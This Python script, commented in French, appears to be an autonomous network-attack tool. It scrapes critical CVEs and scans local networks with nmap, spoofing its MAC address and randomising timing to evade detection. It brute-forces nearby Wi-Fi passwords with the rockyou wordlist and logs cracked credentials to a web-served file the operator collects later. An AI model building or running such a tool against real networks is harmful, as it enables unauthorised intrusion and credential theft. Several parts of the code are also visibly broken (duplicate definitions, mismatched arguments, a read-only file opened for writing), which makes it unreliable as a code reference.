import time
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
import json
from selenium.webdriver.common.devtools.v85.indexed_db import Key
from selenium.webdriver.support.wait import WebDriverWait
import netifaces
import nmap #pip3 install python-nmap
import ipaddress
import subprocess
import string
import random
import re
import socket
import os
from random import randint
from time import sleep
import argparse
import wifi

# Variable modifiable
NMAP_OPT = ['-n -sP -T2', '-sn -PS80,21,53 -T2','-sn -PA21,22,80 -T2']  # -n pas de résolution DNS / -sP juste des ping ; TCP SYN ; TCP ACK #https://hub.packtpub.com/discovering-network-hosts-with-tcp-syn-and-tcp-ack-ping-scans-in-nmaptutorial/
INTERFACE_WIFI = "wlan0"
WIFI_NAME = None  
WIFI_PASSWORD = None
CHANGE_MAC = False
CVE_FILE = 'cve.json'
WORDLIST = "rockyou.txt"
MY_WIFI = "my4gwifi"

global current_interface, level, nm, local_ip

#Crée le json contenant la liste des CVE
def create_cve_json():
    ser = Service(r'C:\geckodriver.exe')
    driver = webdriver.Firefox(service=ser)
    driver.get(
        "https://www.cvedetails.com/vulnerability-list.php?vendor_id=0&product_id=0&version_id=0&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=9&cvssscoremax=10&year=0&month=0&cweid=0&order=1&trc=19275&sha=c560d509f935c26128bfb13d2f2dadfcea62215b")
    number_cve = int(driver.find_element(By.XPATH, '//*[@id="pagingb"]/b').text)
    '''
    json_data = []
    with open('cve.json', 'w', encoding='utf-8') as f:
        json.dump(json_data, f, ensure_ascii=False, indent=4)
    f.close()
    '''
    ok = True
    page_num = 327
    cve_cpt = 16350
    while ok:
        with open(CVE_FILE, encoding='utf-8') as json_file:
            json_data = json.load(json_file)
        json_file.close()

        page_num = page_num + 1
        driver.get(
            "https://www.cvedetails.com/vulnerability-list.php?vendor_id=0&product_id=0&version_id=0&page=" + str(
                page_num) + "&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=9&cvssscoremax=10&year=0&month=0&cweid=0&order=1&trc=19275&sha=c560d509f935c26128bfb13d2f2dadfcea62215b")
        rows = driver.find_element(By.ID, "vulnslisttable").find_element(By.TAG_NAME, 'tbody').find_elements(
            By.TAG_NAME, 'tr')[1:]
        for o in range(0, len(rows), 2):

            cve_cpt = cve_cpt + 1
            row = rows.pop(0)
            link = row.find_element(By.XPATH, 'td[2]/a').get_attribute('href')
            columns = row.find_elements(By.TAG_NAME, 'td')
            actual_cve_number = int(columns.pop(0).text)

            if actual_cve_number > number_cve:
                ok = False
                break
            cve_data = {'CVE_ID': '', 'CWE_ID': '', '#': '', 'Vulnerability': '', 'Publish Date': '', 'Update Date': '',
                        'Score': '', 'Gained Access Level': '', 'Access': '', 'Complexity': '', 'Authentication': '',
                        'Conf': '', 'Integ': '', 'Avail': '', 'Description': '', 'Products Affected': []}

            cve_data['Description'] = rows.pop(0).find_element(By.TAG_NAME, 'td').text
            for i in range(0, 13):
                cve_data[list(cve_data)[i]] = columns.pop(0).text

            driver.execute_script('window.open("' + link + '","_blank");')
            driver.switch_to.window(driver.window_handles[1])

            try:
                tab_product_affected = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "vulnprodstable"))).find_element(By.TAG_NAME,
                                                                                            'tbody').find_elements(
                    By.TAG_NAME, 'tr')[1:]
                for tr in tab_product_affected:
                    data_product = {'id': '', 'Product Type': '', 'Vendor': '', 'Product': '', 'Version': '',
                                    'Update': '', 'Edition': '', 'Language': ''}
                    tds = tr.find_elements(By.TAG_NAME, 'td')
                    for j in range(0, 7):
                        data_product[list(data_product)[j]] = tds.pop(0).text
                    cve_data['Products Affected'].append(data_product)
            except:
                print("")
            driver.close()
            driver.switch_to.window(driver.window_handles[0])
            print(cve_cpt, "/", number_cve)
            json_data.append(cve_data)

        with open(CVE_FILE, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, ensure_ascii=False, indent=4)
        f.close()
    driver.close()

#MAJ du json
def cve_json_maj():
    ser = Service(r'C:\geckodriver.exe')
    driver = webdriver.Firefox(service=ser)
    driver.get(
        "https://www.cvedetails.com/vulnerability-list.php?vendor_id=0&product_id=0&version_id=0&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=9&cvssscoremax=10&year=0&month=0&cweid=0&order=1&trc=19275&sha=c560d509f935c26128bfb13d2f2dadfcea62215b")
    number_cve = int(driver.find_element(By.XPATH, '//*[@id="pagingb"]/b').text)
    with open(CVE_FILE, encoding='utf-8') as json_file:
        json_data = json.load(json_file)
    json_file.close()

    ok = True
    page_num = 0
    cve_cpt = 0
    while ok:
        page_num = page_num + 1
        driver.get(
            "https://www.cvedetails.com/vulnerability-list.php?vendor_id=0&product_id=0&version_id=0&page=" + str(
                page_num) + "&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=9&cvssscoremax=10&year=0&month=0&cweid=0&order=1&trc=19275&sha=c560d509f935c26128bfb13d2f2dadfcea62215b")
        rows = driver.find_element(By.ID, "vulnslisttable").find_element(By.TAG_NAME, 'tbody').find_elements(
            By.TAG_NAME, 'tr')[1:]
        for o in range(0, len(rows), 2):

            cve_cpt = cve_cpt + 1
            row = rows.pop(0)
            link = row.find_element(By.XPATH, 'td[2]/a').get_attribute('href')
            columns = row.find_elements(By.TAG_NAME, 'td')
            actual_cve_number = int(columns.pop(0).text)

            if actual_cve_number > number_cve:
                ok = False
                break

            cve_id = columns.pop(0).text
            update_date = columns.pop(4).text
            Description = rows.pop(0).find_element(By.TAG_NAME, 'td').text
            got = False
            for cve in json_data:
                if cve_id == cve['CVE_ID']:
                    got = True
                    if not update_date == cve['Update Date']:
                        print("update", cve['CVE_ID'], cve['Update Date'])
                        json_data.remove(cve)
                        got = False

            if not got:
                cve_data = {'CVE_ID': '', 'CWE_ID': '', '#': '', 'Vulnerability': '', 'Publish Date': '',
                            'Update Date': '', 'Score': '', 'Gained Access Level': '', 'Access': '', 'Complexity': '',
                            'Authentication': '', 'Conf': '', 'Integ': '', 'Avail': '', 'Description': '',
                            'Products Affected': []}

                cve_data['Description'] = Description
                cve_data['CVE_ID'] = cve_id
                cve_data['Update Date'] = update_date
                for i in range(1, 13):
                    if i == 5:
                        pass
                    else:
                        cve_data[list(cve_data)[i]] = columns.pop(0).text

                driver.execute_script('window.open("' + link + '","_blank");')
                driver.switch_to.window(driver.window_handles[1])

                try:
                    tab_product_affected = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.ID, "vulnprodstable"))).find_element(By.TAG_NAME,
                                                                                                'tbody').find_elements(
                        By.TAG_NAME, 'tr')[1:]
                    for tr in tab_product_affected:
                        data_product = {'id': '', 'Product Type': '', 'Vendor': '', 'Product': '', 'Version': '',
                                        'Update': '', 'Edition': '', 'Language': ''}
                        tds = tr.find_elements(By.TAG_NAME, 'td')
                        for j in range(0, 7):
                            data_product[list(data_product)[j]] = tds.pop(0).text
                        cve_data['Products Affected'].append(data_product)
                except:
                    print("")
                driver.close()
                driver.switch_to.window(driver.window_handles[0])
                print(cve_cpt, cve_id, update_date, "add")
                json_data.append(cve_data)

            print(cve_cpt, "/", number_cve)
    with open(CVE_FILE, 'w', encoding='utf-8') as f:
        json.dump(json_data, f, ensure_ascii=False, indent=4)
    f.close()
    driver.close()

#Recherche d'une CVE avec le nom d'un produit et la version
def search_cve_id(product_name, product_version):
    result = []
    with open(CVE_FILE, encoding='utf-8') as json_file:
        cve_list = json.load(json_file)
    json_file.close()

    for cve in cve_list:
        for product in cve['Products Affected']:
            if product['Product'].lower() == product_name.lower():
                if product_version:
                    if product_version.lower() == product['Version']:
                        result.append(cve['CVE_ID'])
                        break
                else:
                    result.append(cve['CVE_ID'])
                    break
    return result

#Recherche d'une CVE avec le nom d'un produit
def search_cve_id(product_name):
    result = []
    with open(CVE_FILE, encoding='utf-8') as json_file:
        cve_list = json.load(json_file)
    json_file.close()

    for cve in cve_list:
        for product in cve['Products Affected']:
            if product['Product'].lower() == product_name.lower():
                result.append(cve['CVE_ID'])
                break
    return result

#Récupère les information d'une CVE avec l'id de celle ci
def get_cve_data(cve_id):
    with open(CVE_FILE, encoding='utf-8') as json_file:
        cve_list = json.load(json_file)
    json_file.close()
    for cve in cve_list:
        if cve['CVE_ID'] == cve_id:
            return cve

# Génère une adresse MAC aléatoire
def get_random_mac_address():
    uppercased_hexdigits = ''.join(set(string.hexdigits.upper()))
    mac = ""
    for i in range(6):
        for j in range(2):
            if i == 0:
                mac += random.choice("02468ACE")
            else:
                mac += random.choice(uppercased_hexdigits)
        mac += ":"
    return mac.strip(":")

# Récupère l'adresse MAC actuelle
def get_current_mac_address():
    output = subprocess.check_output(f"ifconfig {current_interface}", shell=True).decode()
    return re.search("ether (.+) ", output).group().split()[1].strip()

# Change l'adresse MAC
def change_mac_address():
    new_mac = get_random_mac_address()
    subprocess.check_output(f"ifconfig {current_interface} down", shell=True)
    subprocess.check_output(f"ifconfig {current_interface} hw ether {new_mac}", shell=True)
    subprocess.check_output(f"ifconfig {current_interface} up", shell=True)

# Écrit les logs dans un fichier / un rapport
def write_log(text):
    with open("/var/www/html/file/log.txt","a") as f:
        f.write(text+"\n")
    f.close()

# Récupère la liste des machines opérationnelles sur le réseau
def get_all_hosts(host, host_list):
    new_host_list = []
    option_dict = {key: [] for key in NMAP_OPT}

    for i in range(0, pow(256, level + 1)):
        if str(host + i) not in host_list:
            for option in NMAP_OPT:
                nm.scan(hosts=str(host + i), arguments=option)
                sleep(randint(1, 9) / 100)
                if CHANGE_MAC:
                    change_mac_address()
                print(host + i)
                for h in nm.all_hosts():
                    option_dict[option].append(h)
                    host_list.append(h)
                    new_host_list.append(h)

            if str(host + i) in host_list:
                for opt in NMAP_OPT:
                    if str(host + i) not in option_dict[opt]:
                        write_log("Cette ip est protéger des scan " + opt + ": " + str(host + i))

    return new_host_list, host_list

# Scanne les CVE
#git clone https://github.com/scipag/vulscan.git
#chmod +x updateFiles.sh
#./updateFiles.sh

def scan_cve():
    host_list = []
    for level in range(0, 2):
        host = ipaddress.IPv4Address(
            re.findall('(^([0-9]*.){' + str(3 - level) + '})', local_ip)[0][0][:-1] + ('.0' * (level + 1)))
        new_host_list, host_list = get_all_hosts(host, host_list)
        write_log("List des hosts au level " + str(level) + " : " + str(new_host_list))

        for host in new_host_list:
            nm.scan(hosts=host, arguments="--script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sV")
            output_scan = nm._scan_result['scan']
            output_scan = str(output_scan)

            scan_results_test = "vulners"
            if scan_results_test in output_scan:
                for list in output_scan:
                    cve_id = list[0]
                    service = list[1]
                    version = list[2]


                    cve_data = None
                    if cve_id is not None:
                        cve_data = get_cve_data(cve_id)
                    elif service is not None and version is not None:
                        id = search_cve_id(service,version)
                        cve_data = get_cve_data(id)

                    if cve_data:
                        write_log(cve_data)

# Scanne les accès Wifi disponibles
def wifi_scanner():
    wifilist = []
    cells = wifi.Cell.all(INTERFACE_WIFI)
    for cell in cells:
        wifilist.append(cell)
    return wifilist

# Recherche un accès Wifi
def get_wifi(cells):
    for cell in cells:
        if cell.ssid == WIFI_NAME:
            return cell
    return None

# Recherche avec le ssid un wifi déja connue
def Find_Saved_wifi(ssid):
    cell = wifi.Scheme.find('wlan0', ssid)

    if cell:
        return cell

    return False

# Ajoute un wifi dans la list des connue
def Add_wifi(cell, password=None):
    if not cell:
        return False

    scheme = wifi.Scheme.for_cell('wlan0', cell.ssid, cell, password)
    scheme.save()
    return scheme

# supprime un wifi de la liste des connue
def Delete_wifi(ssid):
    cell = Find_Saved_wifi(ssid)
    if cell:
        cell.delete()

# Test la connection a un wifi
def wifi_connect(cell, ssid, password=None):
    if cell is not None and ssid is not None:
        savedcell = Find_Saved_wifi(cell.ssid)
        if savedcell:
            savedcell.activate()
            return cell

        scheme = Add_wifi(cell, password)
        try:
            print(INTERFACE_WIFI, cell.ssid, cell, password)
            scheme.activate()
        except wifi.exceptions.ConnectionError:
            Delete_wifi(ssid)
            return False
        return cell
    return False

# Se connecter à un wifi et change l'ip
def wifi_known_connect(iprouter, ssid, password=None):

    f = open("/etc/wpa_supplicant/wpa_supplicant.conf")
    f.write("country=FR")
    f.write("ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev")
    f.write("update_config=1")
    f.write("network={")
    f.write("    ssid='" + ssid + "'")
    f.write("    scan_ssid=1")
    f.write("    psk='" + password + "'")
    f.write("    key_mgmt=WPA-PSK")
    f.write("}")
    f.close()

    f = open("/etc/dhcpcd.conf", "a")
    f.write("interface wlan0")
    f.write("static ip_address=+iprouter/24")  # Déterminer IP (À FAIRE)
    f.write("static routers=" + iprouter)
    f.write("static domain_name_servers=8.8.8.8")
    f.close()

#Brute force le wifi avec une wordlist
def brutforce_wifi(ssid):
    with open(WORDLIST,"r") as f:
        data = f.readlines()
    f.close()

    for word in data:
        try:
            cell = wifi_connect(ssid,word)
            if cell != False:
                write_log("wifi : pass >"+word+" ; id >"+ssid)
                return cell
        except:
            pass
    return False

# Programme principal
def prog():
    # Initialisation des variables
    current_interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    nm = nmap.PortScanner()
    local_ip = socket.gethostbyname(socket.gethostname())

    # Si connecté en ethernet
    if "eth0" in current_interface:
        write_log("l'interface réseau est en ethernet : " + current_interface)
        write_log("l'ip actuel et : " + local_ip)
        scan_cve()

    # Wifi
    list_wifi = wifi_scanner()
    cell = wifi_connect(get_wifi(list_wifi), WIFI_NAME, WIFI_PASSWORD)
    if cell != False:
        scan_cve()
        list_wifi.remove(WIFI_NAME)

    for wifi in list_wifi:
        cell = brutforce_wifi(wifi)
        if wifi == MY_WIFI:
            #start le server web
            #le fichier log et dirrectement disponible sur le server web
            subprocess.run(("systemctl start nginx").split())
            return True
        elif cell != False:
            scan_cve()
    return False


if __name__ == '__main__':
    # Tourne en boucle en actualisant la liste des CVE si connecté
    while True:
        status = prog()
        if status:
            break
        if os.system("ping -c 1 google.com") == 0:
            cve_json_maj()
